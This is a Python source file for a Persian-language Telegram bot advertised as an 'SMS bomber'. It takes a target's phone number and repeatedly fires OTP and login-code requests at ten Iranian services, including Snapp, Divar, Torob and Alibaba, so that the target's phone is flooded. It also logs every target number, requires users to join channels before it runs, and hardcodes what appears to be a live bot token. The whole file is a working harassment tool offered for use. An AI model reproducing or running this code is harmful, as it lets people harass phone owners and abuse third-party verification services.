from datetime import datetime, timezone, timedelta
import os
import sqlite3
import threading
import time
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    Update,
)
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from requests import get, post

# --- تنظیمات اصلی ---
TOKEN = "8548161807:AAH8lFRYKThuNt1kJAxUH3aazVq17ABh7mA"
ADMIN_ID = 1601379026

# دیکشنری‌های وضعیت و کنترل پردازش‌ها
active_tasks = {}
user_states = {}

# --- پایگاه داده (SQLite) ---
DB_NAME = "bot_database.db"

def get_iran_time():
  # تنظیم منطقه زمانی ایران (UTC+3:30)
  iran_tz = timezone(timedelta(hours=3, minutes=30))
  return datetime.now(iran_tz).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
  conn = sqlite3.connect(DB_NAME, check_same_thread=False)
  cursor = conn.cursor()
  cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            is_banned INTEGER DEFAULT 0,
            join_date DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_active TEXT
        )
    """)
  cursor.execute("""
        CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    """)
  cursor.execute("""
        CREATE TABLE IF NOT EXISTS force_channels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            channel_username TEXT UNIQUE,
            joined_count INTEGER DEFAULT 0
        )
    """)
  conn.commit()
  conn.close()

init_db()

def db_add_user(user_id, username):
  conn = sqlite3.connect(DB_NAME, check_same_thread=False)
  cursor = conn.cursor()
  now = get_iran_time()
  cursor.execute("""
        INSERT INTO users (user_id, username, last_active) VALUES (?, ?, ?)
        ON CONFLICT(user_id) DO UPDATE SET username=excluded.username, last_active=excluded.last_active
    """, (user_id, username, now))
  conn.commit()
  conn.close()

def db_update_activity(user_id):
  conn = sqlite3.connect(DB_NAME, check_same_thread=False)
  cursor = conn.cursor()
  now = get_iran_time()
  cursor.execute("UPDATE users SET last_active = ? WHERE user_id = ?", (now, user_id))
  conn.commit()
  conn.close()

def db_is_banned(user_id):
  conn = sqlite3.connect(DB_NAME, check_same_thread=False)
  cursor = conn.cursor()
  cursor.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
  res = cursor.fetchone()
  conn.close()
  return res[0] == 1 if res else False

def db_toggle_ban(user_id):
  conn = sqlite3.connect(DB_NAME, check_same_thread=False)
  cursor = conn.cursor()
  cursor.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
  res = cursor.fetchone()
  if res:
    new_status = 0 if res[0] == 1 else 1
    cursor.execute("UPDATE users SET is_banned = ? WHERE user_id = ?", (new_status, user_id))
    conn.commit()
  conn.close()

def db_get_all_users():
  conn = sqlite3.connect(DB_NAME, check_same_thread=False)
  cursor = conn.cursor()
  cursor.execute("SELECT user_id, username, is_banned, last_active FROM users ORDER BY last_active DESC")
  res = cursor.fetchall()
  conn.close()
  return res

def db_add_history(user_id, phone):
  conn = sqlite3.connect(DB_NAME, check_same_thread=False)
  cursor = conn.cursor()
  cursor.execute("INSERT INTO history (user_id, phone) VALUES (?, ?)", (user_id, phone))
  conn.commit()
  conn.close()

def db_get_history(user_id):
  conn = sqlite3.connect(DB_NAME, check_same_thread=False)
  cursor = conn.cursor()
  cursor.execute("SELECT DISTINCT phone FROM history WHERE user_id = ? ORDER BY id DESC LIMIT 5", (user_id,))
  res = cursor.fetchall()
  conn.close()
  return [row[0] for row in res]

def get_active_channels():
  conn = sqlite3.connect(DB_NAME, check_same_thread=False)
  cursor = conn.cursor()
  cursor.execute("SELECT channel_username, joined_count FROM force_channels")
  res = cursor.fetchall()
  conn.close()
  return res

def add_force_channel(channel):
  conn = sqlite3.connect(DB_NAME, check_same_thread=False)
  cursor = conn.cursor()
  try:
    cursor.execute("INSERT OR IGNORE INTO force_channels (channel_username, joined_count) VALUES (?, 0)", (channel,))
    conn.commit()
    success = cursor.rowcount > 0
  except:
    success = False
  conn.close()
  return success

def remove_force_channel(channel):
  conn = sqlite3.connect(DB_NAME, check_same_thread=False)
  cursor = conn.cursor()
  cursor.execute("DELETE FROM force_channels WHERE channel_username = ?", (channel,))
  conn.commit()
  conn.close()

def increment_channel_join(channel):
  conn = sqlite3.connect(DB_NAME, check_same_thread=False)
  cursor = conn.cursor()
  cursor.execute("UPDATE force_channels SET joined_count = joined_count + 1 WHERE channel_username = ?", (channel,))
  conn.commit()
  conn.close()

async def check_all_memberships(user_id, context: ContextTypes.DEFAULT_TYPE):
  channels = get_active_channels()
  if not channels:
    return True, None
  
  for ch, _ in channels:
    try:
      member = await context.bot.get_chat_member(chat_id=ch, user_id=user_id)
      if member.status not in ["member", "administrator", "creator"]:
        return False, ch
    except:
      pass
  return True, None

# --- توابع ارسال درخواست ---
def snap(phone):
  try:
    post(timeout=3, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", json={"cellphone": phone})
  except: pass

def gap(phone):
  try:
    fp = phone.split("+")[1] if "+" in phone else phone
    get(timeout=3, url=f"https://core.gap.im/v1/user/add.json?mobile=%2B{fp}")
  except: pass

def tap30(phone):
  try:
    cp = "0" + phone.split("+98")[1] if "+98" in phone else phone
    post(timeout=3, url="https://tap33.me/api/v2/user", json={"credential": {"phoneNumber": cp, "role": "PASSENGER"}})
  except: pass

def divar(phone):
  try:
    cp = phone.split("+98")[1] if "+98" in phone else phone.lstrip("0")
    post(timeout=3, url="https://api.divar.ir/v5/auth/authenticate", json={"phone": cp})
  except: pass

def torob(phone):
  try:
    cp = "0" + phone.split("+98")[1] if "+98" in phone else phone
    get(timeout=3, url=f"https://api.torob.com/a/phone/send-pin/?phone_number={cp}")
  except: pass

def snapfood(phone):
  try:
    cp = "0" + phone.split("+98")[1] if "+98" in phone else phone
    post(timeout=3, url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa", data={"cellphone": cp})
  except: pass

def sheypoor(phone):
  try:
    cp = "0" + phone.split("+98")[1] if "+98" in phone else phone
    post(timeout=3, url="https://www.sheypoor.com/auth", data={"username": cp})
  except: pass

def alibaba(phone):
  try:
    cp = "0" + phone.split("+98")[1] if "+98" in phone else phone
    post(timeout=3, url="https://ws.alibaba.ir/api/v3/account/mobile/otp", json={"phoneNumber": cp})
  except: pass

def smarket(phone):
  try:
    cp = "0" + phone.split("+98")[1] if "+98" in phone else phone
    post(timeout=3, url=f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={cp}")
  except: pass

def gapfilm(phone):
  try:
    cp = phone.split("+98")[1] if "+98" in phone else phone.lstrip("0")
    post(timeout=3, url="https://core.gapfilm.ir/api/v3.1/Account/Login", json={"Type": 3, "Username": cp, "SourceChannel": "GF_WebSite", "SourcePlatform": "desktop"})
  except: pass

# --- ارسال پیام پایان ---
async def notify_finish(context: ContextTypes.DEFAULT_TYPE):
  user_id = context.job.data
  if not active_tasks.get(user_id, False):
    return
  
  active_tasks[user_id] = False
  reply_kb = [
      [KeyboardButton(text="📂 پنل کاربری و تاریخچه", style="primary")]
  ]
  if user_id == ADMIN_ID:
    reply_kb.append([KeyboardButton(text="👑 پنل مدیریت ادمین", style="success")])
  
  markup = ReplyKeyboardMarkup(reply_kb, resize_keyboard=True)
  await context.bot.send_message(
      chat_id=user_id,
      text="⚡ **عملیات به پایان رسید.**",
      reply_markup=markup,
      parse_mode="Markdown"
  )

# --- منطق اصلی ربات ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
  user = update.effective_user
  db_add_user(user.id, user.username)

  if db_is_banned(user.id):
    await update.message.reply_text("⛔ شما از استفاده از این ربات محروم شده‌اید.")
    return

  is_member, failed_ch = await check_all_memberships(user.id, context)
  if not is_member and failed_ch:
    ch_clean = failed_ch.replace("@", "")
    context.user_data["pending_channel"] = failed_ch
    keyboard = [
        [InlineKeyboardButton(text="📢 عضویت در کانال", url=f"https://t.me/{ch_clean}", style="primary")]
    ]
    keyboard.append([InlineKeyboardButton(text="🔄 بررسی مجدد عضویت", callback_data=f"check_join_{failed_ch}", style="success")])
    await update.message.reply_text(
        f"⚠️ **برای استفاده از امکانات ربات، لطفاً ابتدا در کانال `{failed_ch}` عضو شوید:**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    return

  await show_main_menu(update, context)

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
  user_id = update.effective_user.id
  
  reply_kb = [
      [KeyboardButton(text="📂 پنل کاربری و تاریخچه", style="primary")],
  ]
  if user_id == ADMIN_ID:
    reply_kb.append([KeyboardButton(text="👑 پنل مدیریت ادمین", style="success")])
  
  markup = ReplyKeyboardMarkup(reply_kb, resize_keyboard=True)
  
  text = (
      "🚀 **به ربات اس ام اس بمبر خوش آمدید**\n\n"
      "📌 **راهنمای فرمت شماره:**\n"
      "لطفاً شماره هدف را با یکی از الگوهای زیر ارسال کنید:\n"
      "▫️ `09123456789`\n"
      "▫️ `+989123456789`\n\n"
      "👇 *شماره هدف را ارسال کنید.:*"
  )
  
  if update.message:
    await update.message.reply_text(text, reply_markup=markup, parse_mode="Markdown")
  elif update.callback_query:
    await update.callback_query.message.reply_text(text, reply_markup=markup, parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
  user = update.effective_user
  user_id = user.id  # رفع خطای تعریف نشده بودن user_id
  text = update.message.text.strip() if update.message.text else ""

  if db_is_banned(user_id):
    await update.message.reply_text("⛔ شما مسدود هستید.")
    return

  db_update_activity(user_id)

  if user_id == ADMIN_ID and user_states.get(user_id) == "waiting_new_channel":
    if text.startswith("@"):
      added = add_force_channel(text)
      user_states[user_id] = None
      if added:
        await update.message.reply_text(f"✅ کانال `{text}` با موفقیت اضافه شد!", parse_mode="Markdown")
      else:
        await update.message.reply_text("❌ این کانال قبلاً ثبت شده یا خطایی رخ داده است.")
      await send_admin_panel_msg(update, context)
    else:
      await update.message.reply_text("❌ آیدی کانال حتماً باید با `@` شروع شود:")
    return

  if user_id == ADMIN_ID and user_states.get(user_id) == "waiting_backup_file":
    if update.message.document:
      file = await update.message.document.get_file()
      await file.download_to_drive(DB_NAME)
      user_states[user_id] = None
      await update.message.reply_text("✅ **بک‌آپ با موفقیت بازیابی شد!**", parse_mode="Markdown")
      await send_admin_panel_msg(update, context)
      return
    else:
      await update.message.reply_text("❌ لطفاً یک فایل دیتابیس معتبر ارسال کنید.")
      return

  if text == "📂 پنل کاربری و تاریخچه":
    await send_user_panel(update, context)
    return

  if text == "👑 پنل مدیریت ادمین" and user_id == ADMIN_ID:
    await send_admin_panel(update, context)
    return

  if not (text.startswith("09") or text.startswith("+98")):
    await update.message.reply_text("❌ **فرمت اشتباه!** لطفاً شماره را مطابق الگو ارسال کنید:", parse_mode="Markdown")
    return

  target = text
  if not target.startswith("+98"):
    if target.startswith("09"):
      target = "+98" + target[1:]

  db_add_history(user_id, target)
  
  stop_markup = ReplyKeyboardMarkup([[KeyboardButton(text="🛑 توقف عملیات", style="danger")]], resize_keyboard=True)
  await update.message.reply_text(
      f"⚡ **عملیات ارسال روی شماره `{target}` آغاز شد...**",
      reply_markup=stop_markup,
      parse_mode="Markdown"
  )
  
  start_bombing(user_id, target, context)

def start_bombing(user_id, target, context):
  active_tasks[user_id] = True

  def run_bomb():
    services = [snap, gap, tap30, divar, torob, snapfood, sheypoor, alibaba, smarket, gapfilm]
    start_time = time.time()

    while active_tasks.get(user_id, False):
      if time.time() - start_time > 30:
        break
      for service in services:
        if not active_tasks.get(user_id, False):
          break
        try:
          service(target)
        except:
          pass
        time.sleep(2.0)  # وقفه ایمن ۲ ثانیه برای جلوگیری از بلاک آی‌پی

    if active_tasks.get(user_id, False):
      active_tasks[user_id] = False
      context.job_queue.run_once(notify_finish, 0, data=user_id)

  threading.Thread(target=run_bomb).start()

async def send_user_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
  user_id = update.effective_user.id
  history = db_get_history(user_id)

  keyboard = []
  if history:
    for phone in history:
      keyboard.append([InlineKeyboardButton(text=f"📱 {phone}", style="primary", callback_data=f"history_{phone}")])
  else:
    keyboard.append([InlineKeyboardButton(text="📭 تاریخچه‌ای ثبت نشده است", style="danger", callback_data="none")])

  markup = InlineKeyboardMarkup(keyboard)
  await update.message.reply_text(
      "📂 **پنل کاربری و تاریخچه شماره‌ها**\n\n"
      "لیست ۵ شماره اخیری که جستجو کرده‌اید:\n"
      "*(برای تکرار عملیات روی شماره مورد نظر کلیک کنید)*",
      reply_markup=markup,
      parse_mode="Markdown"
  )

async def send_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
  await send_admin_panel_msg(update, context)

async def send_admin_panel_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
  conn = sqlite3.connect(DB_NAME)
  cursor = conn.cursor()
  cursor.execute("SELECT COUNT(*) FROM users")
  total_users = cursor.fetchone()[0]
  cursor.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
  banned_users = cursor.fetchone()[0]
  cursor.execute("SELECT COUNT(*) FROM history")
  total_attacks = cursor.fetchone()[0]
  conn.close()

  # پنل ادمین بدون دکمه‌های بن مجزا و با دکمه مدیریت کاربران
  keyboard = [
      [InlineKeyboardButton(text="👥 مدیریت کاربران", style="primary", callback_data="admin_users_list_0")],
      [InlineKeyboardButton(text="📢 مدیریت جوین اجباری", style="primary", callback_data="admin_manage_channels")],
      [InlineKeyboardButton(text="📥 دانلود بک‌آپ دیتابیس", style="primary", callback_data="admin_download_backup")],
      [InlineKeyboardButton(text="📤 آپلود و بازیابی بک‌آپ", style="primary", callback_data="admin_upload_backup")],
      [InlineKeyboardButton(text="📊 بروزرسانی آمار", style="success", callback_data="admin_stats")]
  ]
  markup = InlineKeyboardMarkup(keyboard)

  text = (
      "👑 **پنل مدیریت پیشرفته ادمین**\n\n"
      f"👥 کل کاربران ربات: `{total_users}`\n"
      f"⛔ کاربران مسدود شده: `{banned_users}`\n"
      f"🚀 کل درخواست‌های ثبت شده: `{total_attacks}`"
  )
  
  if update.message:
    await update.message.reply_text(text, reply_markup=markup, parse_mode="Markdown")
  elif update.callback_query:
    await update.callback_query.message.reply_text(text, reply_markup=markup, parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
  query = update.callback_query
  await query.answer()
  user_id = query.from_user.id
  data = query.data

  if data.startswith("check_join_"):
    ch = data.replace("check_join_", "")
    try:
      member = await context.bot.get_chat_member(chat_id=ch, user_id=user_id)
      if member.status in ["member", "administrator", "creator"]:
        increment_channel_join(ch)
        await query.message.delete()
        await show_main_menu(update, context)
      else:
        await query.answer("❌ شما هنوز در کانال عضو نشده‌اید!", show_alert=True)
    except:
      await query.answer("❌ خطا در بررسی عضویت!", show_alert=True)

  elif data.startswith("admin_users_list_"):
    if user_id == ADMIN_ID:
      page = int(data.replace("admin_users_list_", ""))
      users = db_get_all_users()
      
      per_page = 5  # تعداد کاربران در هر صفحه
      total_pages = (len(users) + per_page - 1) // per_page
      page = max(0, min(page, total_pages - 1)) if total_pages > 0 else 0
      
      paginated_users = users[page * per_page : (page + 1) * per_page]
      
      keyboard = []
      for u_id, u_name, u_banned, u_date in paginated_users:
        name_str = f"@{u_name}" if u_name else f"id:{u_id}"
        ban_text = "✅ آن‌بن کردن" if u_banned == 1 else "🚫 بن کردن"
        ban_style = "success" if u_banned == 1 else "danger"
        
        # استخراج ساعت از تاریخ آخرین فعالیت
        time_str = u_date.split(" ")[1][:5] if u_date else "--:--"
        
        keyboard.append([InlineKeyboardButton(text=f"👤 {name_str} | {u_id}", style="primary", callback_data="none_info")])
        keyboard.append([
            InlineKeyboardButton(text=f"🕒 {time_str}", style="primary", callback_data="none_info"),
            InlineKeyboardButton(text=ban_text, style=ban_style, callback_data=f"toggle_ban_{u_id}_{page}")
        ])
        keyboard.append([InlineKeyboardButton(text="----------------------------------------", style="primary", callback_data="none_info")])
      
      # دکمه‌های صفحه‌بندی
      nav_buttons = []
      if page > 0:
        nav_buttons.append(InlineKeyboardButton(text="⬅️ صفحه قبل", style="primary", callback_data=f"admin_users_list_{page - 1}"))
      if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton(text="صفحه بعد ➡️", style="primary", callback_data=f"admin_users_list_{page + 1}"))
      
      if nav_buttons:
        keyboard.append(nav_buttons)
        
      keyboard.append([InlineKeyboardButton(text="🔙 بازگشت به منو", style="danger", callback_data="admin_stats")])
      
      await query.edit_message_text(
          f"📋 **مدیریت کاربران (صفحه {page + 1} از {max(total_pages, 1)})**",
          reply_markup=InlineKeyboardMarkup(keyboard),
          parse_mode="Markdown"
      )

  elif data.startswith("toggle_ban_"):
    if user_id == ADMIN_ID:
      parts = data.split("_")
      target_uid = int(parts[2])
      page = int(parts[3])
      db_toggle_ban(target_uid)
      
      users = db_get_all_users()
      per_page = 5
      total_pages = (len(users) + per_page - 1) // per_page
      page = max(0, min(page, total_pages - 1)) if total_pages > 0 else 0
      paginated_users = users[page * per_page : (page + 1) * per_page]
      
      keyboard = []
      for u_id, u_name, u_banned, u_date in paginated_users:
        name_str = f"@{u_name}" if u_name else f"id:{u_id}"
        ban_text = "✅ آن‌بن کردن" if u_banned == 1 else "🚫 بن کردن"
        ban_style = "success" if u_banned == 1 else "danger"
        
        # استخراج ساعت از تاریخ آخرین فعالیت
        time_str = u_date.split(" ")[1][:5] if u_date else "--:--"
        
        keyboard.append([InlineKeyboardButton(text=f"👤 {name_str} | {u_id}", style="primary", callback_data="none_info")])
        keyboard.append([
            InlineKeyboardButton(text=f"🕒 {time_str}", style="primary", callback_data="none_info"),
            InlineKeyboardButton(text=ban_text, style=ban_style, callback_data=f"toggle_ban_{u_id}_{page}")
        ])
        keyboard.append([InlineKeyboardButton(text="----------------------------------------", style="primary", callback_data="none_info")])
      
      # دکمه‌های صفحه‌بندی
      nav_buttons = []
      if page > 0:
        nav_buttons.append(InlineKeyboardButton(text="⬅️ صفحه قبل", style="primary", callback_data=f"admin_users_list_{page - 1}"))
      if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton(text="صفحه بعد ➡️", style="primary", callback_data=f"admin_users_list_{page + 1}"))
      
      if nav_buttons:
        keyboard.append(nav_buttons)
        
      keyboard.append([InlineKeyboardButton(text="🔙 بازگشت به منو", style="danger", callback_data="admin_stats")])
      
      await query.edit_message_text(
          f"📋 **مدیریت کاربران (صفحه {page + 1} از {max(total_pages, 1)})**",
          reply_markup=InlineKeyboardMarkup(keyboard),
          parse_mode="Markdown"
      )

  elif data.startswith("toggle_ban_"):
    if user_id == ADMIN_ID:
      parts = data.split("_")
      target_uid = int(parts[2])
      page = int(parts[3])
      db_toggle_ban(target_uid)
      
      users = db_get_all_users()
      per_page = 5
      total_pages = (len(users) + per_page - 1) // per_page
      page = max(0, min(page, total_pages - 1)) if total_pages > 0 else 0
      paginated_users = users[page * per_page : (page + 1) * per_page]
      
      keyboard = []
      for u_id, u_name, u_banned, u_date in paginated_users:
        name_str = f"@{u_name}" if u_name else f"id:{u_id}"
        ban_text = "✅ آن‌بن کردن" if u_banned == 1 else "🚫 بن کردن"
        ban_style = "success" if u_banned == 1 else "danger"
        time_str = u_date.split(" ")[1][:5] if u_date else "--:--"
        
        keyboard.append([InlineKeyboardButton(text=f"👤 {name_str} | {u_id}", style="primary", callback_data="none_info")])
        keyboard.append([
            InlineKeyboardButton(text=f"🕒 {time_str}", style="primary", callback_data="none_info"),
            InlineKeyboardButton(text=ban_text, style=ban_style, callback_data=f"toggle_ban_{u_id}_{page}")
        ])
        keyboard.append([InlineKeyboardButton(text="----------------------------------------", style="primary", callback_data="none_info")])
      
      nav_buttons = []
      if page > 0:
        nav_buttons.append(InlineKeyboardButton(text="⬅️ صفحه قبل", style="primary", callback_data=f"admin_users_list_{page - 1}"))
      if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton(text="صفحه بعد ➡️", style="primary", callback_data=f"admin_users_list_{page + 1}"))
      if nav_buttons:
        keyboard.append(nav_buttons)
        
      keyboard.append([InlineKeyboardButton(text="🔙 بازگشت به منو", style="danger", callback_data="admin_stats")])
      
      await query.edit_message_text(
          f"📋 **مدیریت کاربران (صفحه {page + 1} از {max(total_pages, 1)})**\n*(وضعیت کاربر به‌روز شد)*",
          reply_markup=InlineKeyboardMarkup(keyboard),
          parse_mode="Markdown"
      )

  elif data == "admin_manage_channels":
    if user_id == ADMIN_ID:
      keyboard = [
          [InlineKeyboardButton(text="➕ ثبت کانال جدید", style="success", callback_data="admin_add_ch")],
          [InlineKeyboardButton(text="📋 کانال‌های فعال", style="primary", callback_data="admin_list_ch")],
          [InlineKeyboardButton(text="🔙 بازگشت به پنل", style="danger", callback_data="admin_stats")]
      ]
      await query.edit_message_text(
          "📢 **بخش مدیریت کانال‌های جوین اجباری**\n\nلطفاً یکی از گزینه‌های زیر را انتخاب کنید:",
          reply_markup=InlineKeyboardMarkup(keyboard),
          parse_mode="Markdown"
      )

  elif data == "admin_add_ch":
    if user_id == ADMIN_ID:
      user_states[user_id] = "waiting_new_channel"
      await query.message.reply_text("✏️ **لطفاً آیدی کانال را همراه با `@` ارسال کنید:**", parse_mode="Markdown")

  elif data == "admin_list_ch":
    if user_id == ADMIN_ID:
      channels = get_active_channels()
      if not channels:
        await query.answer("📭 هیچ کانالی ثبت نشده است!", show_alert=True)
        return
      
      keyboard = []
      for ch, count in channels:
        keyboard.append([InlineKeyboardButton(text=f"📢 {ch} (جذب: {count})", style="primary", callback_data=f"ch_info_{ch}")])
      keyboard.append([InlineKeyboardButton(text="🔙 بازگشت", style="danger", callback_data="admin_manage_channels")])
      
      await query.edit_message_text(
          "📋 **لیست کانال‌های فعال جوین اجباری:**",
          reply_markup=InlineKeyboardMarkup(keyboard),
          parse_mode="Markdown"
      )

  elif data.startswith("ch_info_"):
    if user_id == ADMIN_ID:
      ch = data.replace("ch_info_", "")
      try:
        chat = await context.bot.get_chat(chat_id=ch)
        members_count = await context.bot.get_chat_member_count(chat_id=ch)
        
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("SELECT joined_count FROM force_channels WHERE channel_username = ?", (ch,))
        res = cursor.fetchone()
        conn.close()
        joined_count = res[0] if res else 0

        title = chat.title or "بدون نام"
        username = chat.username or ch

        text = (
            f"📢 **اطلاعات کانال:**\n\n"
            f"▪️ **نام کانال:** {title}\n"
            f"▪️ **آیدی:** @{username}\n"
            f"▪️ **تعداد کل ممبرها:** `{members_count}`\n"
            f"▪️ **کاربران جذب‌شده از ربات:** `{joined_count}` نفر"
        )
        keyboard = [
            [InlineKeyboardButton(text="❌ حذف جوین اجباری این کانال", style="danger", callback_data=f"ch_del_{ch}")],
            [InlineKeyboardButton(text="🔙 بازگشت به لیست", style="primary", callback_data="admin_list_ch")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
      except Exception as e:
        await query.answer(f"❌ خطا در دریافت اطلاعات کانال!", show_alert=True)

  elif data.startswith("ch_del_"):
    if user_id == ADMIN_ID:
      ch = data.replace("ch_del_", "")
      remove_force_channel(ch)
      await query.answer(f"✅ کانال {ch} حذف شد!", show_alert=True)
      channels = get_active_channels()
      keyboard = []
      if channels:
        for c, _ in channels:
          keyboard.append([InlineKeyboardButton(text=f"📢 {c}", style="primary", callback_data=f"ch_info_{c}")])
      keyboard.append([InlineKeyboardButton(text="🔙 بازگشت", style="danger", callback_data="admin_manage_channels")])
      await query.edit_message_text("📋 **لیست کانال‌های فعال جوین اجباری:**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

  elif data.startswith("history_"):
    phone = data.split("_")[1]
    context.user_data["confirm_phone"] = phone
    
    keyboard = [
        [
            InlineKeyboardButton(text="✅ بله، شروع کن", style="success", callback_data="conf_yes"),
            InlineKeyboardButton(text="❌ لغو", style="danger", callback_data="conf_no")
        ]
    ]
    await query.message.reply_text(
        f"❓ **آیا مطمئنید که می‌خواهید روی شماره `{phone}` عملیات انجام دهید؟**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

  elif data == "conf_yes":
    phone = context.user_data.get("confirm_phone")
    if phone:
      await query.message.delete()
      
      stop_markup = ReplyKeyboardMarkup([[KeyboardButton(text="🛑 توقف عملیات", style="danger")]], resize_keyboard=True)
      await query.message.reply_text(
          f"⚡ **عملیات روی شماره `{phone}` آغاز شد...**",
          reply_markup=stop_markup,
          parse_mode="Markdown"
      )
      start_bombing(user_id, phone, context)
    else:
      await query.edit_message_text("❌ خطایی رخ داد. لطفاً دوباره تلاش کنید.")

  elif data == "conf_no":
    await query.edit_message_text("❌ عملیات لغو شد.")

  elif data == "admin_download_backup":
    if user_id == ADMIN_ID:
      if os.path.exists(DB_NAME):
        await context.bot.send_document(chat_id=user_id, document=open(DB_NAME, "rb"), caption="💾 **فایل پشتیبان اطلاعات ربات**")
      else:
        await query.answer("❌ فایل دیتابیس یافت نشد!", show_alert=True)

  elif data == "admin_upload_backup":
    if user_id == ADMIN_ID:
      user_states[user_id] = "waiting_backup_file"
      await query.message.reply_text("📂 **لطفاً فایل دیتابیس خود را بفرستید:**", parse_mode="Markdown")

  elif data == "admin_stats":
    if user_id == ADMIN_ID:
      await query.message.delete()
      await send_admin_panel(update, context)

async def stop_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
  user_id = update.effective_user.id
  text = update.message.text

  if text == "🛑 توقف عملیات":
    if active_tasks.get(user_id, False):
      active_tasks[user_id] = False
      
      reply_kb = [
          [KeyboardButton(text="📂 پنل کاربری و تاریخچه", style="primary")],
      ]
      if user_id == ADMIN_ID:
        reply_kb.append([KeyboardButton(text="👑 پنل مدیریت ادمین", style="success")])
        
      await update.message.reply_text(
          "🛑 **عملیات با موفقیت متوقف شد.**",
          reply_markup=ReplyKeyboardMarkup(reply_kb, resize_keyboard=True),
          parse_mode="Markdown"
      )
    else:
      await update.message.reply_text("⚠️ هیچ عملیات فعالی در حال اجرا نیست.")

def main():
  app = ApplicationBuilder().token(TOKEN).read_timeout(30).write_timeout(30).connect_timeout(30).pool_timeout(30).build()

  app.add_handler(CommandHandler("start", start))
  app.add_handler(MessageHandler(filters.Regex("^🛑 توقف عملیات$"), stop_handler))
  app.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL & ~filters.COMMAND, handle_message))
  app.add_handler(CallbackQueryHandler(button_handler))

  print("Advanced User Management Bot is running smoothly...")
  app.run_polling()

if __name__ == "__main__":
  main()
